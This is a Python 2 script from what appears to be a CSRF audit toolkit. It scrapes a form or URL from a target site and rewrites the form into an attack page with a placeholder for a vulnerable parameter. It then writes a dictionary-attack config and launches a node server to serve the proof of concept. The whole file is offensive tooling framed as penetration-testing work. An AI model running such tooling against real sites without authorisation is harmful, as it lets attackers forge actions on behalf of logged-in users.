import optparse
import sys
import requests
import re
from bs4 import BeautifulSoup
import json
import urllib
import urlparse
import os

# server.js location
CSRFT_LOCATION = "./../server.js"
TMP_FOLDER = "/tmp/csrft/"
CONF_FILE = "tmp.conf"

PARAMS = {}
COOKIE = ""

def url_process(url):
    parameters = opts.url.split('?')[1]
    opts.url = opts.url.split('?')[0]
    parameters = dict( (k, v if len(v)>1 else v[0] ) 
           for k, v in urlparse.parse_qs(parameters).iteritems() )

    for param in PARAMS:
        parameters[param] = PARAMS[param]

    opts.url = opts.url + '?' + urlencode(parameters)
    return opts.url

def create_json():
    data = { 'audit': { 'name': 'PoC done with Automatic Tool', 'scenario': [{'attack': []}] }}
    return data

def display_json(data):
    print json.dumps(data, sort_keys=True, indent=2)

def form_process(form_url, selectors):
    req = send_http_request(form_url)
    form = get_form(req.content, selectors)
    form = str(form)
    form = replace_form_with_tokens(form_url, form)
    return form

def replace_form_with_tokens(url, form):
    global PARAMS

    soup = BeautifulSoup(form)
    soup.form['action'] = generate_action_form(url, str(soup.form['action']))
    soup.form['id'] = 'form-attaque'
    for elem in soup.findAll('input'):
        if (elem['name'] in PARAMS):
            elem['value'] = PARAMS[elem['name']]

    form = str(soup).replace('&lt;%value%&gt;', '<%value%>')
    return form

def get_form(content, selectors):
    soup = BeautifulSoup(''.join(content))
    form = soup.findAll('form', selectors)
    if (form is None):
        # if not, exception
        raise Exception('No form on this page !')
    else:
        # if there are some forms, let the user choose one
        if (len(form) > 1):
            iterate_on_all_forms(form)
        elif (len(form) == 0):
            raise Exception('No form with those specified options.')
        else:
            return form[0]
    pass

# create .conf file
def create_conf_file(data):
    global TMP_FOLDER
    global CONF_FILE

    conf_file = TMP_FOLDER + CONF_FILE
    with open(conf_file,"w") as f:
        json.dump(data, f)
    f.close()

# create file with specific data
def create_file(filename, data):
    global TMP_FOLDER

    tmp_file = TMP_FOLDER + filename
    with open(tmp_file, "w") as f:
        f.write(data)
    f.close()

# launch csrft
def launch_csrft():
    global CSRFT_LOCATION
    global TMP_FOLDER
    global CONF_FILE

    os.system("node " + CSRFT_LOCATION + " " + TMP_FOLDER + CONF_FILE)

# iterate on all forms if after findAll (with selectors), len > 1
def iterate_on_all_forms(forms):

    print "Multiple forms, choose one :"
    # disable the flag with the selectors
    # index of the forms (used after with the other threads)
    i = 0
    notFound = False
    # iterate on all the forms
    while (i < len(forms) and not notFound):
        # display the action forms, and ask the user if that's the one
        res = raw_input(forms[i]['action'] + " ? [Y/n] ")
        if (res == "Y"):
            notFound = True
            return forms[i]
        else:
            pass
        i = i + 1
    if (not notFound):
        raise Exception('You should have chosen a form !')

def send_http_request(url):
    global COOKIE

    headers = {}
    if (COOKIE != ""):
        headers['Cookie'] = COOKIE

    req = requests.get(url, headers=headers)
    return req

# function to generatz the action form
def generate_action_form(url, action):
    action = action.lower()
    # first case : http://www.example.com/
    if (action[:4] == "http"):
        return action
    # second case : /form/submit
    elif (action[:1] == "/"):
        if ("//" in url):
            res = url.split('/')
            return res[0] + '//' + res[2] + action
        else:
            res = url.split('/')
            return res[0] + action[:1]
    # third case : ./form/link
    elif (action[:2] == "./"):
        if (url[-1:] != "/"):
            raise('not implemented for this version. ')
        else:
            return url + action[2:]
    # fourth case : #
    elif (action == "#"):
        return url
    else:
        # else : action="test?"
        if (url[-1:] == "/"):
            return url + action
        else:
            string = url.split('/')
            string = string[::-1]
            string[0] = action
            string = string[::-1]
            res = ""
            for val in string:
                res += val + "/"
            res = res[:-1]
            return res

def urlencode(dic):
    res = ""
    for key in dic:
        res = res + "&" + key + "=" + dic[key]
    return res[1:]

# option parser
parser = optparse.OptionParser()
parser.add_option('--form', help='URL to look for the form', dest='form', default=None)
parser.add_option('--name', help='Name of the form', dest='form_name', default=None)
parser.add_option('--id', help='id of the form', dest='form_id', default=None)
parser.add_option('--class', help='Class of the form', dest='form_class', default=None)
parser.add_option('--url', help='GET request ', dest='url', default=None)
parser.add_option('--cookie', help='Cookie to access the form', dest='cookie', default='')
parser.add_option('--dico_file', help='Dictionary file', dest='dico_file', default=None)
parser.add_option('--param', help='Parameter that is vulnerable', dest='param', default=None)
parser.add_option('--special_value', help='If param is already set in URL/Form', dest='special_value', default=False, action='store_true')
parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')

if (len(sys.argv) <= 2):
    parser.print_help()
else:
    (opts, args) = parser.parse_args()
    COOKIE = opts.cookie

    # no param defined
    if (opts.param is None):
        raise Exception('You need to specify a parameter (--param)')

    # both options specified
    if (opts.form is not None and opts.url is not None):
        raise Exception('--form or --url ? Choose only one')

    # no options specified
    if (opts.form is None and opts.url is None):
        raise Exception('Choose one : --form or --url ?')

    # generate selectors
    selectors = {}
    if (opts.form_name is not None):
        selectors['name'] = opts.form_name
    elif (opts.form_id is not None):
        selectors['id'] = opts.form_id
    elif (opts.form_class is not None):
        selectors['class'] = opts.form_class
    else:
        print "[-] No selectors defined"

    if (not opts.special_value):
        PARAMS[opts.param] = '<%value%>'

    for arg in args:
        arg = arg.split('=')
        PARAMS[arg[0]] = arg[1]

    # creating tmp folder
    if not os.path.exists(TMP_FOLDER): os.makedirs(TMP_FOLDER)

    # form process
    if (opts.form is not None):
        attack = {'method' : 'POST'}
        form = form_process(opts.form, selectors)
        create_file('form.html', form)
        if (opts.special_value is False):
            attack['type_attack'] = 'dico'
            attack['file'] = opts.dico_file
        else:
            attack['type_attack'] = 'special_value'
        attack['form'] = TMP_FOLDER + 'form.html'
        data = create_json()
        data['audit']['scenario'][0]['attack'] = [attack]

        create_conf_file(data)
        launch_csrft()

    # url process
    if (opts.url is not None):
        attack = { 'method': 'GET'}
        if (opts.special_value is False):
            attack['type_attack'] = 'dico'
            attack['file'] = opts.dico_file
            attack['url'] = url_process(opts.url)
            # opts.url = 
        else:
            attack['type_attack'] = 'special_value'
            attack['url'] = opts.url
        data = create_json()
        data['audit']['scenario'][0]['attack'] = [attack]

        create_conf_file(data)
        launch_csrft()
